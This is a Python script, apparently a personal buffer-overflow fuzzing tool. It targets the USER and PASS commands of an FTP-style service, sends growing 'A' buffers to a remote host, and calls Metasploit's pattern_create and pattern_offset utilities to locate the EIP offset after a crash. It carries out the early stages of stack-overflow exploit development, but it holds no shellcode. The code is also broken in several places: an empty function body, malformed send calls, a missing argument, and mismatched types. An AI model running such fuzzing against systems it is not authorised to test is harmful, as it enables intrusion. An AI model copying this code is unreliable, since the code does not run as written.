#!/bin/python
import socket, sys, subprocess, os
from ipaddress import ip_address

def Load_Config():

def Offset_Querey(queries):
    queries_num = len(queries)
    regs = queries.keys()
    chunks = queries.values()
    answers = dict.fromkeys(regs)
    counter = 0
    while counter < queries_num:
        for reg in regs:
            ask = "bash /opt/metasploit-git/tools/exploit/pattern_offset.rb -q " + queries[reg].strip() 
            try:
                start = Grab_Command(ask, 1)
                answers[reg] = start
                counter = counter + 1
            except:
                print("sorry, we had an error.")
    return answers

def Querey_Build():
    reps = int(input("how many queries?: "))
    while Num_Valid(reps, 0 ,9999) == False:
        reps = input("Ammount must be a positive integer: ")
    queries = {}
    counter = 0
    while counter < reps:
        reg = input("Please enter regster: ")
        value = input("Please enter Value: ")
        queries[reg] = value
        counter = counter + 1

    return queries

def Grab_Command(command, flag):
    if flag == 0: 
        breakup = command.split(" ")
        result = subprocess.run(breakup, stdout=subprocess.PIPE).strip()
        return result
    elif flag == 1:
        breakup = command.split(" ")
        result = subprocess.run(breakup, stdout=subprocess.PIPE).stdout.decode("utf8").strip()
        return result

def Is_IP(string):
    try: 
        ip_address(string)
        valid = True
    except:
        valid = False
    return valid

def Num_Valid(string, low, high):
    try:
        string = int(string)
        if (string >= low) and (string <= high):
            valid = True
        else: 
            valid = False
    except:
        valid = False
    return valid

def Parser():
    try: 
        if sys.argv[1] == "-h":
            print("USAGE: ", sys.argv[0], "<RHOST> <RPORT>")
        else:
            RHOST = sys.argv[1]
            RPORT = sys.argv[2] 
            while Is_IP(RHOST) == False:
                RHOST = input("IP address invalid, please re-enter: ")
            while Num_Valid(RPORT, 0, 65536) == False:
                RPORT = input("Port is invalid, please re-enter: ")
    except IndexError:
        print("No arguments! Please supply some!")
        RHOST = input("RHOST: ")
        RPORT = input("RPORT: ")
    return RHOST, RPORT

def USER_Fuzz(RHOST, RPORT, flag):
    if flag == 0:
        max_size = input("When shall we give up?: ")
        while Num_Valid(max_size, 0, 9999) == False:
            max_size = input("Ammount must be a Positive integer: ")
        counter = input("Input an ammount by which to increase the sent buffer: ")
        while Num_Valid(counter, 0, 9999) == False:
           counter = input("Ammount must be a Positive integer: ")
        counter = int(counter)
        max_size = int(max_size)
        step = counter
        while counter <= max_size:
            try:
                buffer = b"A" * counter
                print("Fuzzing USER with %s bytes"  %counter )

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                connect=s.connect((RHOST, int(RPORT)))
                s.recv(1024)
                s.send(b'USER ', buffer, b'\r\n')
                s.recv(1024)
                s.send(b"QUIT\r\n")
                s.close()
                counter = counter + step 
            except:
                size = int(len(buffer)-200)
                print("\nCrash at Approximated byte: %s" %size) 
                exit(0)
    elif flag == 1:
        string_size = input("Enter Suspected Offset: ")
        while Num_Valid(string_size, 0, 9999) == False:
            string_size = input("Ammount must be a positive integer: ")
        command = "bash /opt/metasploit-git/tools/exploit/pattern_create.rb -l"
        command = command + string_size
        command = command.strip()
        evil_string = Grab_Command(command, 1)
        evil_string = bytes(evil_string, "utf-8")
        try:
            print("Sending identifying string. ")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            connect=s.connect((RHOST, int(RPORT)))
            s.recv(1024)
            s.send(b"USER " + evil_string + "\r\n")
            s.recv(1024)
            s.send(b"QUIT\r\n")
            s.close()
        except:
            print("Check the contents of the EIP register, and the bytes in the location that ESP point to")
            pass
            querey = Querey_Build()
            answers = Offset_Querey(querey)
            print(str(querey))
            print(str(answers))

def PASS_Fuzz(RHOST, RPORT, flag):
    if flag == 0:
        max_size = input("When shall we give up?: ")
        while Num_Valid(max_size, 0, 9999) == False:
            max_size = input("Ammount must be a Positive integer: ")
        counter = input("Input an ammount by which to increase the sent buffer: ")
        while Num_Valid(counter, 0, 9999) == False:
            counter = input("Ammount must be a Positive integer: ")
        counter = int(counter)
        max_size = int(max_size)
        step = counter
        while counter <= max_size:
            try:
                buffer = b"A" * counter
                print("Fuzzing PASS with %s bytes"  %counter )

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                connect=s.connect((RHOST, int(RPORT)))
                s.recv(1024)
                s.send(b'USER anonymous\r\n')
                s.recv(1024)
                s.send(b'PASS ' + buffer + b"\r\n")
                s.send(b"QUIT\r\n")
                s.close()
                counter = counter + step
            except:
                size = int(len(buffer)-200)
                print("\nCrash at Approximated byte: %s" %size) 
                pass
    elif flag == 1: 
        string_size = input("Enter Suspected Offset: ")
        while Num_Valid(string_size, 0, 9999) == False:
            string_size = input("Ammount must be a positive integer: ")
        command = "bash /opt/metasploit-git/tools/exploit/pattern_create.rb -l"
        command = command + string_size
        command = command.strip()
        evil_string = Grab_Command(command, 1)
        evil_string = bytes(evil_string, "utf-8")
        try:
            print("Sending identifying string. ")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            connect=s.connect((RHOST, int(RPORT)))
            s.recv(1024)
            s.send(b'USER anonymous\r\n')
            s.recv(1024)
            s.send(b'PASS ' + evil_string + b"\r\n")
            s.close()
        except:
            print("Check the contents of the EIP register, and the bytes in the location that ESP point to")
            pass
        querey = Querey_Build()
        answers = Offset_Querey(querey)
        print(str(querey))
        print(str(answers))

def MainMenu():
    RHOST, RPORT = Parser()

    print("-W-E-L-C-O-M-E T-O T-H-E F-U-C-K B-A-R-R-E-L-")

    options = ["[1] USER", "[2] USER OFFSET", "[3] PASS", "[4] PASS OFFSET", "[5] Choose A Protocol File","[6] Select Custom File","[7] Build Custom String", "[8] Querey Offset"]

    main_menu = ""
    for op in options:
        main_menu = main_menu + op + "\n"

    print(main_menu)
    choice = input("\nPlease make a selection: ")
    while Num_Valid(choice, 1, 8) == False: 
        choice = input("\nPlease make a VALID selection: ")
        choice = int(choice)
    
    print("RHOST: ", RHOST, "\nRPORT: ", RPORT,)
    
    if choice == "1": 
        print("[1] USER: Fuzzing target for USER parameter")
        USER_Fuzz(RHOST, RPORT)
    elif choice == "2":
        print("[2] USER OFFSET: Fuzzing target for USER parameter to identify offset")
    elif choice == "3":
        print("[3] PASS: Fuzzing target for PASS parameter")
        PASS_Fuzz(RHOST, RPORT, 0)
    elif choice == "4":
        print("[4] PASS OFFSET: Fuzzing target for PASS parameter to identify offset")
        PASS_Fuzz(RHOST, RPORT, 1)
    elif choice == "5":
        print("[5] Choose A Protocol File")
    elif choice == "6":
        print("[6] Select A Custom File")
    elif choice == "7":
        print("[7] Build Custom String")
    elif choice == "8":
        print("[8] Querey Offset: Enter Necessary Information")
        querey = Querey_Build()
        answers = Offset_Querey
        print(str(querey))
        print(str(answers))

MainMenu()

